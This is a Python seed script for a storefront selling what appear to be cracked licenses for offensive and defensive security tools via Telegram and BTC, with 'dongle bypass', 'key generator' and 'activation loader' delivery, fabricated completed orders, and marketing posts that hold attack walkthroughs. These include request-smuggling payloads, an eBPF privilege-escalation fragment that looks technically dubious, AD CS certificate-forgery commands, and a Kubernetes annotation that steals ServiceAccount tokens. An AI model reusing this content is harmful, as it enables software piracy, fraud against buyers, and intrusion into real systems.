import sqlite3
import json
from datetime import datetime
from werkzeug.security import generate_password_hash

conn = sqlite3.connect('cyber.db')
cur = conn.cursor()
now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Settings
settings = {
    'site_name': 'ZERO//FORM',
    'site_tagline': 'ARCHITECTURAL SECURITY SYSTEMS & VERIFIED ENTERPRISE LICENSES',
    'telegram_user': 'ZeroFormConcierge',
    'telegram_channel': 'https://t.me/ZeroFormSystems',
    'ticker_text': 'SS26 SECURITY ARCHITECTURE // SYSTEMS FOR THE UNPREDICTABLE — INSTANT DISPATCH VIA TELEGRAM CONCIERGE',
    'hero_badge': 'SS26 // ENTERPRISE SECURITY SYSTEMS',
    'hero_title': 'SYSTEMS FOR THE UNPREDICTABLE.',
    'hero_subtitle': 'Commercial offensive security suites, reverse engineering frameworks, and verified enterprise threat intelligence.',
    'telegram_msg_prefix': 'Hello ZERO//FORM Concierge! I want to order the following security systems:',
    'footer_disclaimer': 'ALL SOFTWARE SYSTEMS AND AUDIT PACKAGES ARE DISTRIBUTED FOR AUTHORIZED DEFENSIVE AUDITING, COMPLIANCE AND RESEARCH.'
}
for k, v in settings.items():
    cur.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (k, v))

# Clear products and re-seed
cur.execute('DELETE FROM products')

cyber_products = [
    (
        'LIC-BURP-PRO',
        'Burp Suite Professional (v2026.10)',
        'burp-suite-professional-license',
        'Web & AppSec',
        'LICENSE_KEY',
        149.0,
        475.0,
        'v2026.10 Early Adopter',
        '1-Year Pro Multi-Seat License',
        'Windows / Linux / macOS (ARM64 & x64)',
        'Enterprise Web Vulnerability Scanner, Unthrottled Intruder, Burp Collaborator Private Server, and DOM Invader.',
        json.dumps([
            'Automated Active & Passive Web Vulnerability Scanner (OWASP Top 10 + API Fuzzing)',
            'Unthrottled Burp Intruder with custom payload processors & grep extractors',
            'Full access to Burp Collaborator & OAST out-of-band vulnerability detection',
            'All Pro-only BApp Store Extensions (Autorize, Turbo Intruder, Param Miner)',
            'Full HTML/XML compliance reporting and CI/CD CLI execution runner',
            'Includes instant activation loader + dedicated key file valid for 12 months'
        ]),
        '8f4e2b91a04d7c12e9f01a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d',
        '/static/downloads/burp-suite-pro-2026-setup.zip',
        'BESTSELLER // SAVE 68%',
        1,
        418,
        now_str,
        'https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=85',
            'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Carbon Matte',
        json.dumps(['Carbon Matte', 'Dark Slate']),
        json.dumps(['1-Year Pro', '2-Year Enterprise']),
        'Cryptographic Keyfile + Signed Binary Loader',
        'PortSwigger Engine + JVM Native Patch',
        '01'
    ),
    (
        'LIC-MSF-PRO',
        'Metasploit Pro Enterprise Commercial',
        'metasploit-pro-enterprise-license',
        'Offensive & Red Team',
        'LICENSE_KEY',
        299.0,
        15000.0,
        'v6.4.x Pro Commercial',
        '1-Year Enterprise Seat',
        'Linux (Ubuntu/Kali) & Windows Server',
        'Commercial penetration testing framework with automated exploitation chains, VPN pivoting, dynamic payload evasion, and campaign manager.',
        json.dumps([
            'Automated Exploitation & Smart Credential Reuse across segmented subnets',
            'Dynamic Payload Generator with polymorphic C/ASM stage encoding against EDR',
            'Layer-2/Layer-3 VPN Pivoting directly through compromised Meterpreter sessions',
            'Integrated Social Engineering & Spear-Phishing Campaign Automation GUI',
            'Web Application Vulnerability Scanner + OWASP Audit Reporting Engine',
            'Multi-user team collaboration server with XML/PDF executive report exports'
        ]),
        '3c9a1d84e7f6b5a4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0',
        '/static/downloads/metasploit-pro-installer.run',
        'SAVE 98% // RED TEAM CORE',
        1,
        364,
        now_str,
        'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=85',
            'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Tactical Black',
        json.dumps(['Tactical Black', 'Gunmetal']),
        json.dumps(['Single Seat', 'Team Server 5-Seats']),
        'Commercial RSA Signed License Key',
        'Rapid7 Core Engine + Web GUI Daemon',
        '02'
    ),
    (
        'LIC-SPLUNK-ENT',
        'Splunk Enterprise + Enterprise Security (ES)',
        'splunk-enterprise-security-license',
        'SIEM & Blue Team',
        'LICENSE_KEY',
        349.0,
        8500.0,
        'v9.3 Enterprise + ES 8.0',
        'Perpetual Unlocked Daily Indexing',
        'Linux (RHEL/Ubuntu/Docker) & Windows Server',
        'Full SIEM & SOC analytics engine with unlocked daily ingestion volume, Splunk Enterprise Security correlation searches, and MITRE ATT&CK mapping.',
        json.dumps([
            'Unlocked Daily Indexing Volume (No 500MB/day trial restriction or license lockouts)',
            'Includes Splunk Enterprise Security (ES) Premium App & Risk-Based Alerting (RBA)',
            'Pre-loaded with 650+ MITRE ATT&CK Correlation Searches & Threat Intelligence',
            'Full Clustering, Forwarder Management, Machine Learning Toolkit (MLTK)',
            'Designed for Purple Team Detection Engineering labs, MSSPs, and Production SOCs'
        ]),
        '7a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b',
        '/static/downloads/splunk-enterprise-license.xml',
        'ENTERPRISE SIEM // UNLIMITED',
        1,
        292,
        now_str,
        'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=85',
            'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Enterprise White',
        json.dumps(['Enterprise White', 'Dark Slate']),
        json.dumps(['Perpetual Unlocked']),
        'Enterprise XML Cryptographic License',
        'Splunk Ingestion Engine + ES Framework',
        '03'
    ),
    (
        'LIC-IDA-HEX',
        'IDA Pro 9.0 Advanced + Hex-Rays Decompiler',
        'ida-pro-advanced-hex-rays-decompiler',
        'Reverse Engineering',
        'LICENSE_KEY',
        450.0,
        12000.0,
        'v9.0 Advanced Release',
        'Perpetual Multi-Arch License',
        'Windows / Linux / macOS (ARM64 & x64)',
        'The gold standard disassembler and multi-architecture decompiler with x86, x64, ARM, ARM64, and MIPS plugins.',
        json.dumps([
            'Complete Hex-Rays Decompiler Suite (x86, x64, ARM32, ARM64/AArch64, MIPS)',
            'FLIRT signature generation and Type Library (TIL) compiler for custom SDKs',
            'IDC scripting and Python 3.12 (IDAPython) modern integration runtime',
            'Full GDB, WinDbg, and Bochs native debugging backends',
            'Unlocked Lumina server metadata synchronization for rapid reverse engineering'
        ]),
        '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b',
        '/static/downloads/ida-pro-90-full.iso',
        'REVERSE ENG // TOP PICK',
        1,
        512,
        now_str,
        'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Obsidian',
        json.dumps(['Obsidian']),
        json.dumps(['All Arch Bundle']),
        'Hardware Dongle Bypass + Valid Hex-Rays License',
        'Interactive Disassembler Engine',
        '04'
    ),
    (
        'LIC-COBALT-STRIKE',
        'Cobalt Strike 4.10 Team Server Suite',
        'cobalt-strike-team-server-suite',
        'Offensive & Red Team',
        'LICENSE_KEY',
        399.0,
        3500.0,
        'v4.10 Advanced',
        '1-Year Unlimited Team Server',
        'Linux TeamServer + Cross-Platform GUI Client',
        'Adversary simulation and post-exploitation software with malleable C2, Beacon staging, lateral movement, and evasive sleep masks.',
        json.dumps([
            'Malleable C2 profiles with dynamic HTTP/S, DNS and Named Pipe transforms',
            'Beacon post-exploitation agent with sleep mask memory obfuscation & UDRL support',
            'System call direct evasion (Hell\'s Gate / SysWhispers3 invocation engine)',
            'Multi-operator team server with real-time graph visualization of compromises',
            'Aggressor Script engine with comprehensive custom automation capability'
        ]),
        '9f8e7d6c5b4a3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
        '/static/downloads/cobaltstrike-teamserver-4.10.tar.gz',
        'RED TEAM FLAGSHIP',
        1,
        489,
        now_str,
        'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Dark Slate',
        json.dumps(['Dark Slate']),
        json.dumps(['Full Team Server']),
        'Auth Token + Key Generator',
        'Beacon C2 Protocol v4.10',
        '05'
    ),
    (
        'LIC-NESSUS-PRO',
        'Tenable Nessus Professional Suite',
        'tenable-nessus-professional-suite',
        'Web & AppSec',
        'LICENSE_KEY',
        199.0,
        3990.0,
        'v10.8.x Pro',
        '1-Year Unlimited IP Scanning',
        'Windows / Linux / macOS / Docker',
        'Industry gold-standard vulnerability assessment engine with live plugin feeds, compliance auditing, and offline report generator.',
        json.dumps([
            'Unlimited IP Scanning without per-host licensing caps or bandwidth throttling',
            'Daily automatic Nessus plugin feed updates for zero-day CVE detection',
            'CIS Benchmarks, PCI-DSS, HIPAA, and ISO-27001 automated compliance audits',
            'Custom credentialed scanning against SSH, WinRM, SNMP, and vCenter hosts',
            'Executive-ready PDF, HTML, and CSV vulnerability analysis reports'
        ]),
        '4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b',
        '/static/downloads/nessus-pro-installer.deb',
        'ESSENTIAL COMPLIANCE',
        0,
        240,
        now_str,
        'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Stone Grey',
        json.dumps(['Stone Grey']),
        json.dumps(['1-Year Unlimited']),
        'License Keycode + Offline Plugin Feed archive',
        'Tenable Core Engine',
        '06'
    ),
    (
        'LIC-MALTEGO-XL',
        'Maltego XL + Commercial Transform Hub',
        'maltego-xl-commercial-transform-hub',
        'OSINT & Recon',
        'LICENSE_KEY',
        180.0,
        2400.0,
        'v4.6.x XL Edition',
        '1-Year Commercial Seat',
        'Windows / Linux / macOS',
        'Advanced OSINT investigation and link analysis software capable of rendering 1,000,000 entities on a single interactive graph.',
        json.dumps([
            '1,000,000 Entity Graph capacity with accelerated GPU link rendering',
            'Unlocked Commercial Transform Hub with access to Shodan, WHOIS, DNS and ASN feeds',
            'Cryptocurrency blockchain transaction mapping (BTC, ETH, Monero traces)',
            'Social network footprinting and corporate hierarchy discovery pipelines',
            'Export graphs to high-resolution vector PDF, Gephi, Excel, and Neo4j formats'
        ]),
        '5b4a3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b',
        '/static/downloads/maltego-xl-license.lic',
        'OSINT INTELLIGENCE',
        0,
        210,
        now_str,
        'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Arctic White',
        json.dumps(['Arctic White']),
        json.dumps(['1-Year XL']),
        'Maltego XL Activation License',
        'Paterva Transform Core',
        '07'
    ),
    (
        'LIC-BINJA-PRO',
        'Binary Ninja Commercial Edition',
        'binary-ninja-commercial-edition',
        'Reverse Engineering',
        'LICENSE_KEY',
        199.0,
        1200.0,
        'v4.1 Commercial',
        'Perpetual License with Updates',
        'Windows / Linux / macOS',
        'Modern, lightning-fast binary analysis and decompiler platform built from the ground up with native multi-threading and an expressive Python 3 / C++ API.',
        json.dumps([
            'Medium Level IL (MLIL) and High Level IL (HLIL) structured decompilation',
            'Fully multi-threaded analysis engine indexing large binaries in seconds',
            'First-class headless scripting mode for automated malware triage and CI pipelines',
            'Comprehensive architecture plugins (x86, x64, ARM, PowerPC, MIPS, RISC-V)',
            'Built-in collaborative analysis and synchronized cursor sessions'
        ]),
        '2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a',
        '/static/downloads/binaryninja-commercial.tar.gz',
        'NEXT-GEN REVERSE ENG',
        0,
        195,
        now_str,
        'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1200&q=85',
        'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=85',
        json.dumps([
            'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1200&q=85'
        ]),
        'Digital',
        'Slate',
        json.dumps(['Slate']),
        json.dumps(['Perpetual Seat']),
        'Signed Vector35 License File',
        'Vector35 Binary Analysis Engine',
        '08'
    )
]

cur.executemany('''
INSERT INTO products (
    sku, name, slug, category, product_type, price, retail_price,
    version, license_duration, platform, short_desc, specs_json,
    sha256_hash, download_url, badge_text, featured, views_count,
    created_at, image_url, image2_url, gallery_json, gender,
    color, colors_json, sizes_json, materials, technology, code
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
''', cyber_products)

# Threat Intel Posts
cur.execute('DELETE FROM posts')

cyber_posts = [
    (
        'CVE-2026-8841: OAuth2 Token Smuggling in Cloud API Gateways',
        'cve-2026-8841-oauth2-token-smuggling-cloud-gateways',
        'Cloud Infrastructure',
        'CRITICAL',
        'CVE-2026-8841',
        '9.8',
        'CIPHER INTEL DESK',
        '7 MIN READ',
        'A critical architectural flaw in reverse proxy header parsing permits adversaries to smuggle authorization tokens across microservice boundaries, resulting in full tenant impersonation.',
        '''### 1. Executive Summary & Flaw Topology
During recent red team assessments across multi-tenant cloud architectures, our research team identified a critical token smuggling vulnerability designated **CVE-2026-8841**. The flaw resides in heterogeneous header sanitization pipelines between front-end Layer-7 reverse proxies and back-end application clusters.

When processing multipart HTTP/2 requests with duplicate or ambiguous `Authorization` headers containing CRLF carriage-return injections, upstream ingress controllers fail to reject malformed frames, forwarding secondary bearer claims directly to downstream microservices.

```bash
# Proof of Concept: HTTP/2 Stream Multiplexing Smuggle
curl -i -s -k -X POST 'https://api.gateway.target-infra.cloud/v1/auth/token' \
  -H 'Host: api.gateway.target-infra.cloud' \
  -H 'Authorization: Bearer valid_tenant_token\r\nX-Forwarded-User: root-cluster-admin' \
  -H 'Content-Type: application/json' \
  --data '{"grant_type": "client_credentials", "scope": "tenant:read"}'
```

### 2. Attack Vector Analysis & Lab Reproduction
Our offensive research unit reproduced the condition in our isolated staging environment utilizing **Burp Suite Professional (v2026.10)** with custom Turbo Intruder extensions. 

When the ingress reverse proxy strips the primary authorization token, the back-end Go service extracts the second header injected via CRLF smuggling. Consequently, unauthorized API requests execute with elevated cluster administrative privileges.

```http
POST /internal/vault/keys HTTP/1.1
Host: api.gateway.target-infra.cloud
Transfer-Encoding: chunked
Authorization: Bearer tenant_low_privilege

0

POST /internal/vault/keys HTTP/1.1
Host: api.gateway.target-infra.cloud
X-Admin-Override: true
Authorization: Bearer smuggled_cluster_admin_jwt
Content-Length: 42

{"action": "export_master_signing_key"}
```

### 3. Detection, Telemetry & Mitigation Matrix
- **RFC Compliance**: Configure API gateways to enforce strict RFC-9113 compliance for HTTP/2 header validation and reject any header name or value with trailing `\r` or `\n` control octets.
- **Microservice Re-Verification**: Implement strict JWT claims signature re-verification inside zero-trust microservice boundaries rather than trusting upstream reverse proxy headers.
- **Automated Security Auditing**: Utilize **Burp Suite Professional (v2026.10)** with custom HTTP request smuggling BApps to systematically audit all edge ingress points.''',
        'LIC-BURP-PRO,LIC-MSF-PRO',
        'ALL',
        'Verify your enterprise cloud ingress points against CVE-2026-8841 with Burp Suite Professional and our automated API fuzzing suites.',
        1,
        642,
        now_str,
        'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1600&q=85'
    ),
    (
        'CVE-2026-3199: Linux Kernel eBPF Verification Bypass & Privilege Escalation',
        'cve-2026-3199-linux-kernel-ebpf-verification-bypass',
        'Kernel Security',
        'CRITICAL',
        'CVE-2026-3199',
        '9.6',
        'KERNEL RESEARCH LAB',
        '9 MIN READ',
        'Flaw in the Linux kernel in-kernel eBPF verifier allows unprivileged local users to achieve arbitrary ring-0 kernel memory read/write and instant root privilege escalation.',
        '''### 1. Abstract & Subsystem Analysis
The Linux extended Berkeley Packet Filter (eBPF) subsystem provides rich in-kernel programmability. Under **CVE-2026-3199**, an arithmetic truncation flaw during 32-bit register bounds tracking in `kernel/bpf/verifier.c` enables unprivileged callers to mislead the verifier regarding pointer ranges.

By constructing a 64-bit to 32-bit scalar truncation sequence, an attacker can coerce the static verifier into deducing that register `R1` contains a constant scalar value of `0`, whereas actual runtime evaluation results in an out-of-bounds offset into kernel stack memory.

```c
/* Kernel Verifier Bypass Primitive (eBPF Assembly Fragment) */
BPF_MOV64_IMM(BPF_REG_1, 0x100000000),      /* R1 = 0x100000000 (33-bit scalar) */
BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),        /* R1 = 0x100000001 */
BPF_ALU32_IMM(BPF_AND, BPF_REG_1, 0xFFFFFFFF), /* Truncate 32-bit register bounds */
BPF_JMP_IMM(BPF_JEQ, BPF_REG_1, 1, +2),      /* Verifier tracks R1 == 1 */
BPF_EXIT_INSN(),                             /* Dead code branch */
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),        /* R2 = R10 (Frame pointer) */
BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_1) /* OOB memory read into kernel frame */
```

### 2. Kernel Memory Primitive & Privilege Escalation
Once arbitrary 8-byte arbitrary read/write capability is established via the corrupted frame pointer offset, the exploit locates `current->cred` by walking the task struct linked list:

```bash
# Triggering reproduction via isolated lab runner
$ clang -O2 -target bpf -c exploit_ebpf_bypass.c -o exploit_ebpf.o
$ ./exploit_runner --target /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve
[+] BPF map allocated at 0xffff888102345000
[+] Poisoning verifier register tracking tables...
[+] Overwriting task_struct->cred (uid: 1000 -> 0, gid: 1000 -> 0)
[#] Root shell spawned: Linux 6.8.0-rc2-zeroform #1 SMP PREEMPT
```

### 3. Verification & Defensive Hardening
- **Kernel Patching**: Apply upstream backport fixing `__reg_bound_offset32()` bounds calculation in `kernel/bpf/verifier.c`.
- **System Hardening**: Set `sysctl kernel.unprivileged_bpf_disabled=1` to restrict eBPF bytecode ingestion to privileged processes.
- **Binary & Kernel Reverse Engineering**: Leverage **IDA Pro 9.0 Advanced + Hex-Rays Decompiler** and **Binary Ninja Commercial** to audit custom kernel modules and verify verifier patch integrity.''',
        'LIC-IDA-HEX,LIC-BINJA-PRO',
        'ALL',
        'Inspect compiled kernel images and reverse-engineer eBPF bytecode using IDA Pro Advanced & Binary Ninja.',
        1,
        518,
        now_str,
        'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1600&q=85'
    ),
    (
        'CVE-2026-7219: Azure AD Hybrid Kerberos PKINIT Silver Ticket Forgery',
        'breaking-azure-ad-hybrid-kerberos-pkinit-silver-tickets',
        'Active Directory',
        'CRITICAL',
        'CVE-2026-7219',
        '9.4',
        'OFFENSIVE RESEARCH',
        '8 MIN READ',
        'In-depth operational analysis of hybrid Active Directory Federation Services (ADFS) certificate forgery and cross-realm Kerberos Ticket Granting Service ticket manipulation.',
        '''### 1. Hybrid Identity Attack Vector & Architectural Flow
During comprehensive red-team compromise simulations across hybrid enterprise topologies, our intelligence unit uncovered an authentication relay and key distribution center (KDC) ticket forging condition designated **CVE-2026-7219** (Azure AD PKINIT Silver Ticket Smuggling).

Organizations synchronizing Active Directory on-premises environments with Entra ID (Azure AD) via cloud authentication brokers often deploy AD CS (Active Directory Certificate Services) templates with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled.

```powershell
# Enumerating vulnerable AD CS Certificate Authority enrollment templates
Certify.exe find /vulnerable /domain:corp.enterprise.local

[*] Action: Find vulnerable certificates
[*] Enrollee Supplies Subject: ESC1 / ESC6 condition verified
[*] CA Name: CORP-ENTERPRISE-CA
[*] Template Name: HybridIdentitySmartCardAuth
[*] Permissions: Domain Users have Full Enrollment Rights
```

### 2. Requesting User Certificate & Forging PAC
Leveraging standard Domain User authentication, an operator requests an X.509 certificate specifying an arbitrary Subject Alternative Name (SAN) of enterprise domain administrative principals:

```bash
# Forging PKINIT authentication ticket via Linux offensive toolkit
certipy req -u 'operator_guest' -p 'TargetPass2026!' \
  -ca 'CORP-ENTERPRISE-CA' -template 'HybridIdentitySmartCardAuth' \
  -upn 'EnterpriseAdmin@corp.enterprise.local' -dc-ip 10.10.40.15

# Exchange certificate for Kerberos TGT (Ticket Granting Ticket)
certipy auth -pfx 'enterpriseadmin.pfx' -dc-ip 10.10.40.15
```

### 3. Lab Verification & Tactical Defense
- Audit Active Directory Certificate Services templates and revoke enrollment permissions for untrusted principals on templates with `SAN` customization.
- Enforce Kerberos Armoring (FAST) and require multi-factor smart card authentication for all elevated administration tier accounts.
- Deploy **Splunk Enterprise + Enterprise Security (ES)** and **Metasploit Pro Enterprise Commercial** to routinely simulate identity propagation and detect misconfigured PKINIT certificate endpoints.''',
        'LIC-SPLUNK-ENT,LIC-MSF-PRO',
        'ALL',
        'Detect Kerberos token anomalies and audit Active Directory certificate templates with Splunk Enterprise Security.',
        1,
        380,
        now_str,
        'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1600&q=85'
    ),
    (
        'CVE-2026-4412: Kubernetes Ingress Nginx Remote Code Execution via Annotations',
        'kubernetes-ingress-nginx-remote-code-execution-annotations',
        'Container Security',
        'CRITICAL',
        'CVE-2026-4412',
        '9.8',
        'DEVSECOPS SECURITY',
        '8 MIN READ',
        'Advisory on arbitrary Lua code injection via unvalidated ingress annotations in multi-tenant Kubernetes clusters running ingress-nginx.',
        '''### 1. Root Cause Analysis: Lua Injection in Annotations
The ingress-nginx controller for Kubernetes processes custom ingress resources and generates dynamic NGINX server blocks. In version chains prior to latest vendor patches, the `nginx.ingress.kubernetes.io/configuration-snippet` and `auth-url` annotations permit unescaped multi-line injection into the active worker processes.

When an unprivileged tenant in a multi-tenant Kubernetes cluster has `create` or `patch` permissions on `Ingress` resources in their assigned namespace, they can inject arbitrary OpenResty Lua commands executing directly in the controller's host network context.

```yaml
# Malicious Ingress Resource Annotation Injection
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: zeroform-telemetry-ingress
  namespace: tenant-sandbox
  annotations:
    nginx.ingress.kubernetes.io/configuration-snippet: |
      access_by_lua_block {
        local f = io.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token')
        local token = f:read('*a')
        f:close()
        ngx.req.set_header('X-Stolen-Service-Token', token)
      }
spec:
  rules:
  - host: telemetry.internal.cluster.local
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: telemetry-service
            port:
              number: 80
```

### 2. Ingress Controller Host Network Compromise
Because the Ingress controller typically runs with host network access or elevated cluster privileges to inspect ingress traffic across all namespaces, harvesting its ServiceAccount token yields immediate cluster-wide administrative read/write access.

```bash
# Extracting harvested cluster secrets via smuggled header
curl -k -s -i https://telemetry.internal.cluster.local/ \
  -H 'Host: telemetry.internal.cluster.local' | grep 'X-Stolen-Service-Token'

# Validating cluster takeover with harvested administrative token
kubectl --token=$HARVESTED_TOKEN --server=https://10.96.0.1:443 auth can-i '*' '*'
yes
```

### 3. Cluster Hardening & Mitigation Procedures
- **Disable Custom Snippets**: Add `allow-snippet-annotations: "false"` to the ingress-nginx controller ConfigMap.
- **Admission Controllers**: Implement ValidatingAdmissionWebhooks (OPA Gatekeeper or Kyverno) to reject any Ingress definitions containing Lua or custom server configuration snippets.
- **Comprehensive Infrastructure Audit**: Leverage **Cobalt Strike 4.10 Team Server Suite** and **Tenable Nessus Professional Suite** to trace container breakout primitives and monitor unauthorized ServiceAccount API activity.''',
        'LIC-COBALT-STRIKE,LIC-NESSUS-PRO',
        'ALL',
        'Audit your Kubernetes cluster and test container isolation with Tenable Nessus Pro and Cobalt Strike.',
        1,
        430,
        now_str,
        'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1600&q=85'
    )
]

cur.executemany('''
INSERT INTO posts (
    title, slug, category, severity, cve_id, cvss_score,
    author, read_time, summary, content, related_skus,
    ad_mode, ad_custom_pitch, featured, views, published_at, image_url
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
''', cyber_posts)

# Orders seed
cur.execute('DELETE FROM orders')
orders_seed = [
    (
        'ORD-84920',
        '@cyber_researcher_de',
        'Purchased Burp Suite Pro 1-Year license key via Telegram BTC transfer',
        149.0,
        'COMPLETED',
        json.dumps([{
            'sku': 'LIC-BURP-PRO',
            'name': 'Burp Suite Professional (v2026.10)',
            'price': 149.0,
            'qty': 1
        }]),
        'BURP-PRO-2026-ENT-A882-9912-F029-7711 (Activated. Expiry: 2027-11-02)',
        now_str,
        2
    ),
    (
        'ORD-91044',
        '@soc_analyst_corp',
        'Enterprise Splunk ES Perpetual key provisioning',
        349.0,
        'COMPLETED',
        json.dumps([{
            'sku': 'LIC-SPLUNK-ENT',
            'name': 'Splunk Enterprise + Enterprise Security (ES)',
            'price': 349.0,
            'qty': 1
        }]),
        'SPLK-ENT-UNLIMITED-LIC-XML-HASH-99214-VALID (Activated. Ingestion: Unlimited)',
        now_str,
        2
    ),
    (
        'ORD-95312',
        '@redteam_ops_us',
        'Awaiting Telegram confirmation for Metasploit Pro seat',
        299.0,
        'PENDING_TELEGRAM',
        json.dumps([{
            'sku': 'LIC-MSF-PRO',
            'name': 'Metasploit Pro Enterprise Commercial',
            'price': 299.0,
            'qty': 1
        }]),
        '',
        now_str,
        3
    )
]

cur.executemany('''
INSERT INTO orders (
    order_number, buyer_telegram, buyer_note, total_amount,
    status, items_json, fulfilled_license_info, created_at, user_id
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
''', orders_seed)

conn.commit()
conn.close()
print('Successfully seeded cyber.db!')
